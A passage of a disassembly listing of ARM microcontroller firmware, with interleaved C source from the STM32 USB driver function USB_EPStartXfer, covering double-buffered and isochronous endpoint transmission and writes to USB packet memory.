 80074f4:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80074f8:	3301      	adds	r3, #1
 80074fa:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80074fe:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007500:	881b      	ldrh	r3, [r3, #0]
 8007502:	b29a      	uxth	r2, r3
 8007504:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007508:	b29b      	uxth	r3, r3
 800750a:	029b      	lsls	r3, r3, #10
 800750c:	b29b      	uxth	r3, r3
 800750e:	4313      	orrs	r3, r2
 8007510:	b29a      	uxth	r2, r3
 8007512:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007514:	801a      	strh	r2, [r3, #0]
 8007516:	e024      	b.n	8007562 <USB_EPStartXfer+0x8a8>
 8007518:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800751c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007520:	681b      	ldr	r3, [r3, #0]
 8007522:	785b      	ldrb	r3, [r3, #1]
 8007524:	2b01      	cmp	r3, #1
 8007526:	d11c      	bne.n	8007562 <USB_EPStartXfer+0x8a8>
 8007528:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800752c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007530:	681b      	ldr	r3, [r3, #0]
 8007532:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007536:	b29b      	uxth	r3, r3
 8007538:	461a      	mov	r2, r3
 800753a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 800753c:	4413      	add	r3, r2
 800753e:	643b      	str	r3, [r7, #64]	; 0x40
 8007540:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007544:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007548:	681b      	ldr	r3, [r3, #0]
 800754a:	781b      	ldrb	r3, [r3, #0]
 800754c:	00da      	lsls	r2, r3, #3
 800754e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007550:	4413      	add	r3, r2
 8007552:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007556:	63fb      	str	r3, [r7, #60]	; 0x3c
 8007558:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800755c:	b29a      	uxth	r2, r3
 800755e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8007560:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8007562:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007566:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800756a:	681b      	ldr	r3, [r3, #0]
 800756c:	895b      	ldrh	r3, [r3, #10]
 800756e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007572:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007576:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800757a:	681b      	ldr	r3, [r3, #0]
 800757c:	6959      	ldr	r1, [r3, #20]
 800757e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007582:	b29b      	uxth	r3, r3
 8007584:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007588:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800758c:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007590:	6800      	ldr	r0, [r0, #0]
 8007592:	f001 f89e 	bl	80086d2 <USB_WritePMA>
 8007596:	e227      	b.n	80079e8 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 8007598:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800759c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075a0:	681b      	ldr	r3, [r3, #0]
 80075a2:	6a1b      	ldr	r3, [r3, #32]
 80075a4:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 80075a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075ac:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075b0:	681a      	ldr	r2, [r3, #0]
 80075b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075ba:	681b      	ldr	r3, [r3, #0]
 80075bc:	781b      	ldrb	r3, [r3, #0]
 80075be:	009b      	lsls	r3, r3, #2
 80075c0:	4413      	add	r3, r2
 80075c2:	881b      	ldrh	r3, [r3, #0]
 80075c4:	b29b      	uxth	r3, r3
 80075c6:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 80075ca:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80075ce:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 80075d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075d6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075da:	681a      	ldr	r2, [r3, #0]
 80075dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075e0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075e4:	681b      	ldr	r3, [r3, #0]
 80075e6:	781b      	ldrb	r3, [r3, #0]
 80075e8:	009b      	lsls	r3, r3, #2
 80075ea:	441a      	add	r2, r3
 80075ec:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80075f0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80075f4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80075f8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80075fc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007600:	b29b      	uxth	r3, r3
 8007602:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8007604:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007608:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800760c:	681b      	ldr	r3, [r3, #0]
 800760e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007610:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007614:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007618:	681b      	ldr	r3, [r3, #0]
 800761a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800761e:	b29b      	uxth	r3, r3
 8007620:	461a      	mov	r2, r3
 8007622:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007624:	4413      	add	r3, r2
 8007626:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007628:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800762c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007630:	681b      	ldr	r3, [r3, #0]
 8007632:	781b      	ldrb	r3, [r3, #0]
 8007634:	00da      	lsls	r2, r3, #3
 8007636:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007638:	4413      	add	r3, r2
 800763a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800763e:	65bb      	str	r3, [r7, #88]	; 0x58
 8007640:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007644:	b29a      	uxth	r2, r3
 8007646:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8007648:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 800764a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800764e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007652:	681b      	ldr	r3, [r3, #0]
 8007654:	891b      	ldrh	r3, [r3, #8]
 8007656:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800765a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800765e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007662:	681b      	ldr	r3, [r3, #0]
 8007664:	6959      	ldr	r1, [r3, #20]
 8007666:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800766a:	b29b      	uxth	r3, r3
 800766c:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007670:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007674:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007678:	6800      	ldr	r0, [r0, #0]
 800767a:	f001 f82a 	bl	80086d2 <USB_WritePMA>
 800767e:	e1b3      	b.n	80079e8 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 8007680:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007684:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007688:	681b      	ldr	r3, [r3, #0]
 800768a:	6a1a      	ldr	r2, [r3, #32]
 800768c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007690:	1ad2      	subs	r2, r2, r3
 8007692:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007696:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800769a:	681b      	ldr	r3, [r3, #0]
 800769c:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 800769e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076a2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076a6:	681a      	ldr	r2, [r3, #0]
 80076a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076ac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076b0:	681b      	ldr	r3, [r3, #0]
 80076b2:	781b      	ldrb	r3, [r3, #0]
 80076b4:	009b      	lsls	r3, r3, #2
 80076b6:	4413      	add	r3, r2
 80076b8:	881b      	ldrh	r3, [r3, #0]
 80076ba:	b29b      	uxth	r3, r3
 80076bc:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80076c0:	2b00      	cmp	r3, #0
 80076c2:	f000 80c6 	beq.w	8007852 <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 80076c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076ca:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076ce:	681b      	ldr	r3, [r3, #0]
 80076d0:	673b      	str	r3, [r7, #112]	; 0x70
 80076d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076da:	681b      	ldr	r3, [r3, #0]
 80076dc:	785b      	ldrb	r3, [r3, #1]
 80076de:	2b00      	cmp	r3, #0
 80076e0:	d177      	bne.n	80077d2 <USB_EPStartXfer+0xb18>
 80076e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076e6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076ea:	681b      	ldr	r3, [r3, #0]
 80076ec:	66bb      	str	r3, [r7, #104]	; 0x68
 80076ee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076f2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076f6:	681b      	ldr	r3, [r3, #0]
 80076f8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80076fc:	b29b      	uxth	r3, r3
 80076fe:	461a      	mov	r2, r3
 8007700:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007702:	4413      	add	r3, r2
 8007704:	66bb      	str	r3, [r7, #104]	; 0x68
 8007706:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800770a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800770e:	681b      	ldr	r3, [r3, #0]
 8007710:	781b      	ldrb	r3, [r3, #0]
 8007712:	00da      	lsls	r2, r3, #3
 8007714:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007716:	4413      	add	r3, r2
 8007718:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800771c:	667b      	str	r3, [r7, #100]	; 0x64
 800771e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007720:	881b      	ldrh	r3, [r3, #0]
 8007722:	b29b      	uxth	r3, r3
 8007724:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007728:	b29a      	uxth	r2, r3
 800772a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800772c:	801a      	strh	r2, [r3, #0]
 800772e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007732:	2b3e      	cmp	r3, #62	; 0x3e
 8007734:	d921      	bls.n	800777a <USB_EPStartXfer+0xac0>
 8007736:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800773a:	095b      	lsrs	r3, r3, #5
 800773c:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007740:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007744:	f003 031f 	and.w	r3, r3, #31
 8007748:	2b00      	cmp	r3, #0
 800774a:	d104      	bne.n	8007756 <USB_EPStartXfer+0xa9c>
 800774c:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007750:	3b01      	subs	r3, #1
 8007752:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007756:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007758:	881b      	ldrh	r3, [r3, #0]
 800775a:	b29a      	uxth	r2, r3
 800775c:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007760:	b29b      	uxth	r3, r3
 8007762:	029b      	lsls	r3, r3, #10
 8007764:	b29b      	uxth	r3, r3
 8007766:	4313      	orrs	r3, r2
 8007768:	b29b      	uxth	r3, r3
 800776a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800776e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007772:	b29a      	uxth	r2, r3
 8007774:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007776:	801a      	strh	r2, [r3, #0]
 8007778:	e050      	b.n	800781c <USB_EPStartXfer+0xb62>
 800777a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800777e:	2b00      	cmp	r3, #0
 8007780:	d10a      	bne.n	8007798 <USB_EPStartXfer+0xade>
 8007782:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007784:	881b      	ldrh	r3, [r3, #0]
 8007786:	b29b      	uxth	r3, r3
 8007788:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800778c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007790:	b29a      	uxth	r2, r3
 8007792:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007794:	801a      	strh	r2, [r3, #0]
 8007796:	e041      	b.n	800781c <USB_EPStartXfer+0xb62>
 8007798:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800779c:	085b      	lsrs	r3, r3, #1
 800779e:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80077a2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077a6:	f003 0301 	and.w	r3, r3, #1
 80077aa:	2b00      	cmp	r3, #0
 80077ac:	d004      	beq.n	80077b8 <USB_EPStartXfer+0xafe>
 80077ae:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80077b2:	3301      	adds	r3, #1
 80077b4:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80077b8:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80077ba:	881b      	ldrh	r3, [r3, #0]
 80077bc:	b29a      	uxth	r2, r3
 80077be:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80077c2:	b29b      	uxth	r3, r3
 80077c4:	029b      	lsls	r3, r3, #10
 80077c6:	b29b      	uxth	r3, r3
 80077c8:	4313      	orrs	r3, r2
 80077ca:	b29a      	uxth	r2, r3
 80077cc:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80077ce:	801a      	strh	r2, [r3, #0]
 80077d0:	e024      	b.n	800781c <USB_EPStartXfer+0xb62>
 80077d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077da:	681b      	ldr	r3, [r3, #0]
 80077dc:	785b      	ldrb	r3, [r3, #1]
 80077de:	2b01      	cmp	r3, #1
 80077e0:	d11c      	bne.n	800781c <USB_EPStartXfer+0xb62>
 80077e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077e6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077ea:	681b      	ldr	r3, [r3, #0]
 80077ec:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80077f0:	b29b      	uxth	r3, r3
 80077f2:	461a      	mov	r2, r3
 80077f4:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80077f6:	4413      	add	r3, r2
 80077f8:	673b      	str	r3, [r7, #112]	; 0x70
 80077fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007802:	681b      	ldr	r3, [r3, #0]
 8007804:	781b      	ldrb	r3, [r3, #0]
 8007806:	00da      	lsls	r2, r3, #3
 8007808:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800780a:	4413      	add	r3, r2
 800780c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007810:	66fb      	str	r3, [r7, #108]	; 0x6c
 8007812:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007816:	b29a      	uxth	r2, r3
 8007818:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 800781a:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 800781c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007820:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007824:	681b      	ldr	r3, [r3, #0]
 8007826:	895b      	ldrh	r3, [r3, #10]
 8007828:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800782c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007830:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007834:	681b      	ldr	r3, [r3, #0]
 8007836:	6959      	ldr	r1, [r3, #20]
 8007838:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800783c:	b29b      	uxth	r3, r3
 800783e:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007842:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007846:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800784a:	6800      	ldr	r0, [r0, #0]
 800784c:	f000 ff41 	bl	80086d2 <USB_WritePMA>
 8007850:	e0ca      	b.n	80079e8 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8007852:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007856:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800785a:	681b      	ldr	r3, [r3, #0]
 800785c:	785b      	ldrb	r3, [r3, #1]
 800785e:	2b00      	cmp	r3, #0
 8007860:	d177      	bne.n	8007952 <USB_EPStartXfer+0xc98>
 8007862:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007866:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800786a:	681b      	ldr	r3, [r3, #0]
 800786c:	67fb      	str	r3, [r7, #124]	; 0x7c
 800786e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007872:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007876:	681b      	ldr	r3, [r3, #0]
 8007878:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800787c:	b29b      	uxth	r3, r3
 800787e:	461a      	mov	r2, r3
 8007880:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007882:	4413      	add	r3, r2
 8007884:	67fb      	str	r3, [r7, #124]	; 0x7c
 8007886:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800788a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800788e:	681b      	ldr	r3, [r3, #0]
 8007890:	781b      	ldrb	r3, [r3, #0]
 8007892:	00da      	lsls	r2, r3, #3
 8007894:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007896:	4413      	add	r3, r2
 8007898:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800789c:	67bb      	str	r3, [r7, #120]	; 0x78
 800789e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078a0:	881b      	ldrh	r3, [r3, #0]
 80078a2:	b29b      	uxth	r3, r3
 80078a4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80078a8:	b29a      	uxth	r2, r3
 80078aa:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078ac:	801a      	strh	r2, [r3, #0]
 80078ae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078b2:	2b3e      	cmp	r3, #62	; 0x3e
 80078b4:	d921      	bls.n	80078fa <USB_EPStartXfer+0xc40>
 80078b6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078ba:	095b      	lsrs	r3, r3, #5
 80078bc:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80078c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078c4:	f003 031f 	and.w	r3, r3, #31
 80078c8:	2b00      	cmp	r3, #0
 80078ca:	d104      	bne.n	80078d6 <USB_EPStartXfer+0xc1c>
 80078cc:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80078d0:	3b01      	subs	r3, #1
 80078d2:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80078d6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078d8:	881b      	ldrh	r3, [r3, #0]
 80078da:	b29a      	uxth	r2, r3
 80078dc:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80078e0:	b29b      	uxth	r3, r3
 80078e2:	029b      	lsls	r3, r3, #10
 80078e4:	b29b      	uxth	r3, r3
 80078e6:	4313      	orrs	r3, r2
 80078e8:	b29b      	uxth	r3, r3
 80078ea:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078ee:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078f2:	b29a      	uxth	r2, r3
 80078f4:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078f6:	801a      	strh	r2, [r3, #0]
 80078f8:	e05c      	b.n	80079b4 <USB_EPStartXfer+0xcfa>
 80078fa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078fe:	2b00      	cmp	r3, #0
 8007900:	d10a      	bne.n	8007918 <USB_EPStartXfer+0xc5e>
 8007902:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007904:	881b      	ldrh	r3, [r3, #0]
 8007906:	b29b      	uxth	r3, r3
 8007908:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800790c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007910:	b29a      	uxth	r2, r3
 8007912:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007914:	801a      	strh	r2, [r3, #0]
 8007916:	e04d      	b.n	80079b4 <USB_EPStartXfer+0xcfa>
 8007918:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800791c:	085b      	lsrs	r3, r3, #1
 800791e:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007922:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007926:	f003 0301 	and.w	r3, r3, #1
 800792a:	2b00      	cmp	r3, #0
 800792c:	d004      	beq.n	8007938 <USB_EPStartXfer+0xc7e>
 800792e:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007932:	3301      	adds	r3, #1
 8007934:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007938:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800793a:	881b      	ldrh	r3, [r3, #0]
 800793c:	b29a      	uxth	r2, r3
 800793e:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007942:	b29b      	uxth	r3, r3
 8007944:	029b      	lsls	r3, r3, #10
 8007946:	b29b      	uxth	r3, r3
 8007948:	4313      	orrs	r3, r2
 800794a:	b29a      	uxth	r2, r3
 800794c:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800794e:	801a      	strh	r2, [r3, #0]
 8007950:	e030      	b.n	80079b4 <USB_EPStartXfer+0xcfa>
 8007952:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007956:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800795a:	681b      	ldr	r3, [r3, #0]
 800795c:	785b      	ldrb	r3, [r3, #1]
 800795e:	2b01      	cmp	r3, #1
 8007960:	d128      	bne.n	80079b4 <USB_EPStartXfer+0xcfa>
 8007962:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007966:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800796a:	681b      	ldr	r3, [r3, #0]
 800796c:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 8007970:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007974:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007978:	681b      	ldr	r3, [r3, #0]
 800797a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800797e:	b29b      	uxth	r3, r3
 8007980:	461a      	mov	r2, r3
 8007982:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 8007986:	4413      	add	r3, r2
 8007988:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 800798c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007990:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007994:	681b      	ldr	r3, [r3, #0]
 8007996:	781b      	ldrb	r3, [r3, #0]
 8007998:	00da      	lsls	r2, r3, #3
 800799a:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 800799e:	4413      	add	r3, r2
 80079a0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80079a4:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80079a8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80079ac:	b29a      	uxth	r2, r3
 80079ae:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80079b2:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 80079b4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079b8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079bc:	681b      	ldr	r3, [r3, #0]
 80079be:	891b      	ldrh	r3, [r3, #8]
 80079c0:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80079c4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079c8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079cc:	681b      	ldr	r3, [r3, #0]
 80079ce:	6959      	ldr	r1, [r3, #20]
 80079d0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80079d4:	b29b      	uxth	r3, r3
 80079d6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80079da:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80079de:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80079e2:	6800      	ldr	r0, [r0, #0]
 80079e4:	f000 fe75 	bl	80086d2 <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 80079e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80079f0:	681a      	ldr	r2, [r3, #0]
 80079f2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079f6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079fa:	681b      	ldr	r3, [r3, #0]
 80079fc:	781b      	ldrb	r3, [r3, #0]
 80079fe:	009b      	lsls	r3, r3, #2
 8007a00:	4413      	add	r3, r2
 8007a02:	881b      	ldrh	r3, [r3, #0]
 8007a04:	b29b      	uxth	r3, r3
 8007a06:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007a0a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8007a0e:	817b      	strh	r3, [r7, #10]
 8007a10:	897b      	ldrh	r3, [r7, #10]
 8007a12:	f083 0310 	eor.w	r3, r3, #16
 8007a16:	817b      	strh	r3, [r7, #10]
 8007a18:	897b      	ldrh	r3, [r7, #10]
 8007a1a:	f083 0320 	eor.w	r3, r3, #32
 8007a1e:	817b      	strh	r3, [r7, #10]
 8007a20:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a24:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a28:	681a      	ldr	r2, [r3, #0]
 8007a2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
